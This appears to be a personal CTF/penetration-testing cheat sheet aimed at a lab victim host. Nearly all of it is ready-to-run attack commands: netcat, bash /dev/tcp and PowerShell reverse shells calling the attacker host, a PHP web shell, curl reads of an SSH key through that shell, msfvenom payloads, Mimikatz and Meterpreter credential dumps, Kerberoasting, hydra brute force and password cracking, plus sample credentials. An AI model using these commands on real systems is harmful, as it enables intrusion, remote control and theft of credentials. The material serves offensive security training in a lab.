CTF

Attacker: 10.10.1.2
Victim: 10.10.1.10


# Reverse Shells
[https://www.revshells.com/](https://www.revshells.com/)

Netcat
```sh
nc 10.10.1.2 4444 -e /bin/bash
```

Bash
```sh
/bin/bash -i >& /dev/tcp/10.10.1.2/4444 0>&1
```

PHP cmd
```sh
<?php system($_GET['cmd']); ?>
```

Curl
```sh
curl http://10.10.1.10/upload/cmd.php?cmd=cat%20/var/www/id_rsa > id_rsa
```


# Crackmapexec

```sh
crackmapexec winrm 10.10.1.10 -u Administrator -p passlist
```

Metasploit: Metasploit Auxiliary module `Auxiliary/scanner/winrm/winrm_login`


# Crunch
By the rules we can crack administrator password. We use crunch to generate sequence number at last two digits and a special character.

A symbol + username(Uppercase) + 4 digits of the year you born
```sh
crunch 18 18 -t ^ADMINISTRATOR19%% > passlist
```


# Curl
Example
```sh
curl http://10.10.1.10/upload/cmd.php?cmd=cat%20/var/www/id_rsa > id_rsa
```

Example - user flag
```sh
curl http://10.10.1.10/upload/cmd.php?cmd=cat%20/home/henry/Desktop/user.txt
```


# Evil-winrm
Install
```
root@kali [~/evil-winrm]# bundle install
```

```sh
evil-winrm -i 10.10.1.10 -u Administrator -p '#ADMINISTRATOR1998’
```


# Hydra
## Hydra FTP
```sh
hydra -l rex -P /usr/share/wordlists/rockyou.txt -u 10.10.1.10 ftp
```


# Impacket
Clock skew
```sh
apt update; apt install ntpdate; ntpdate 10.10.1.10; hwclock --systohc
```

```sh
python3 /usr/share/doc/python3-impacket/examples/GetUserSpn.py -dc-ip 10.10.1.10 CyberQ.local/faiz:rebelde -request
```


# John

SSH passphrase
```sh
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

```sh
john id_rsa.hash
```

```sh
john -w /usr/share/wordlists/rockyou.txt id_rsa.hash
```

```sh
john -w /usr/share/wordlists/rockyou.txt --format=Raw-SHA256 id_rsa.hash
```


# Metasploit

## Meterpreter Hash dump
```sh
msf6 > use post/windows/gather/hashdump

msf6 post(windows/gather/hashdump) > set SESSION 1

msf6 post(windows/gather/hashdump) > exploit
```


## MSFVenom
### Tomcat - war
```sh
msfvenom -p java/jspshellreverse_tcp lhost=10.10.1.2 lport=4444 -f war > shell.war
```
- netcat listener
```
nc -lnvp 4444
```


# Mimikatz
```sh
mimikatz # privilege::debug
mimikatz # inject::process lsass.exe sekurlsa.dll
mimikatz # @getLogonPasswords
```


# Nmap

```sh
nmap -T 4 -p - -A 10.10.1.10
```

Scan port 80
```
nmap -sV -sC -p 80 10.10.1.10
```

Scan UDP port 2049
```
nmap -sV -sC -sU -p 2049 10.10.1.10
```


# SSH
## SSH Tunnel
```sh
ssh -i id_rsa -L 8000:127.0.0.1:8000 cyberq@10.10.1.10
```

```sh
firefox http://localhost:8000
```


# SMBMap
Default Output:
```sh
./smbmap.py -H 192.168.12.123 -u administrator -p asdf1234
```

Command execution:
```sh
python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
```

Non recursive path listing (ls):
```sh
python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
```

File Content Searching:
```sh
python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
```

Drive Listing:
```sh
python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
```

Nifty Shell:
```sh
python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 10.10.1.10 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""10.10.1.2""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
```

Attackers Netcat Listener:
```
nc -l 4445
```

# SQLMap
Telling sqlmap Where To Inject
```sh
sqlmap -u http://host/script?id=11-(case when 1=1* then 1)
```


# WPScan
Scan a target WordPress URL and enumerate any plugins that are installed:
```sh
wpscan --url http://wordpress.local --enumerate p
```

## Enumerating usernames
```sh
wpscan --url https://target.tld/ --enumerate u
```

Enumerating a range of usernames
```sh
wpscan --url https://target.tld/ --enumerate u1-100
```
- replace u1-100 with a range of your choice.


# Wordlist
Userlist
```
Administrator
faiz
henry
rex
```

Password
```
#ADMINISTRATOR1998
boylover1
rebelde
```


# URLS
[Reverse Shells Generator](https://www.revshells.com/)
[Cyber Chef](https://gchq.github.io/CyberChef/)
[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
[pentestmonkey](https://pentestmonkey.net/)
[https://fuzzysecurity.com/](https://fuzzysecurity.com/)

[https://github.com/AlanFoster/toolbox](https://github.com/AlanFoster/toolbox)
[https://github.com/infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

## Cheat Sheets
[https://highon.coffee/blog/cheat-sheet/](https://highon.coffee/blog/cheat-sheet/)
[pentestmonkey Cheat Sheet](https://pentestmonkey.net/category/cheat-sheet)
[Thor-Sec Cheat Sheets](https://thor-sec.com/cheatsheets/)
